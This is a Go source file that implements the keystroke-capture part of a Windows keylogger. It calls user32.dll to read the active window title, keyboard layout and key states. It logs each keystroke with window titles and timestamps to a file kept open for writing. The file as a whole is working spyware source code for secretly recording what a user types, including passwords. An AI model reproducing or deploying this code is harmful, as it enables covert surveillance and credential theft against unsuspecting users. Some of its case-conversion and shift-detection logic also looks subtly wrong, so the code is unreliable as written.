package windows

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var FORMAT = 0

const (
	MAPVK_VK_TO_CHAR uintptr = 0x02
)

// Windows dll functions
var (
	user32DLL = syscall.NewLazyDLL("user32.dll")

	getForegroundWindow      = user32DLL.NewProc("GetForegroundWindow")
	getWindowThreadProcessId = user32DLL.NewProc("GetWindowThreadProcessId")
	getKeyboardLayout        = user32DLL.NewProc("GetKeyboardLayout")
	getWindowText            = user32DLL.NewProc("GetWindowTextW")
	mapVirtualKeyEx          = user32DLL.NewProc("MapVirtualKeyExW")
	getKeyState              = user32DLL.NewProc("GetKeyState")
)

var (
	OutputFile *os.File
	lastWindow string
)

func Save(keyStroke int) int {
	var output strings.Builder

	// Ignore mouse clicks
	if keyStroke == 1 || keyStroke == 2 {
		return 0
	}

	foreground, _, _ := getForegroundWindow.Call()

	var threadID uint32
	var layout uintptr

	if foreground != 0 {
		// Get keyboard layout of the thread
		getWindowThreadProcessId.Call(foreground, uintptr(unsafe.Pointer(&threadID)))
		layout, _, _ = getKeyboardLayout.Call(uintptr(threadID))
	}

	if foreground != 0 {
		windowTitle := make([]uint16, 256)
		getWindowText.Call(foreground, uintptr(unsafe.Pointer(&windowTitle[0])), 256)
		windowTitleStr := syscall.UTF16ToString(windowTitle)

		if windowTitleStr != lastWindow {
			lastWindow = windowTitleStr

			// Get time
			t := time.Now()
			s := t.Format("Jan 2 2006 15:04:05")

			output.WriteString(fmt.Sprintf("\n\n[Window: %s - at %s] ", windowTitleStr, s))
		}
	}

	// Format key stroke
	// Change FORMAT value to 10, 16, or any other number as needed
	switch FORMAT {
	case 10:
		output.WriteString(fmt.Sprintf("[%d]", keyStroke))
	case 16:
		output.WriteString(fmt.Sprintf("[%X]", keyStroke))
	default:
		keyName, found := keyName[keyStroke]
		if found {
			output.WriteString(keyName)
		} else {
			var key byte
			lowercase := (getKeyStateFunc(VK_CAPITAL) & 0x0001) == 0

			// Check shift key
			if (getKeyStateFunc(VK_SHIFT)&0x1000) != 0 ||
				(getKeyStateFunc(VK_LSHIFT)&0x1000) != 0 ||
				(getKeyStateFunc(VK_RSHIFT)&0x1000) != 0 {
				lowercase = !lowercase
			}

			// Map virtual key according to keyboard layout
			virtualKey, _, _ := mapVirtualKeyEx.Call(uintptr(keyStroke), MAPVK_VK_TO_CHAR, layout)

			key = byte(virtualKey)
			// Convert to lowercase if needed
			if !lowercase {
				key = byte(strings.ToLower(string(key))[0])
			}
			output.WriteByte(key)
		}
	}

	// Instead of opening and closing file handlers every time, keep file open and flush.
	OutputFile.WriteString(output.String())
	OutputFile.Sync()

	fmt.Print(output.String())

	return 0
}

func getKeyStateFunc(keyCode int) int16 {
	r, _, _ := getKeyState.Call(uintptr(keyCode))
	return int16(r)
}
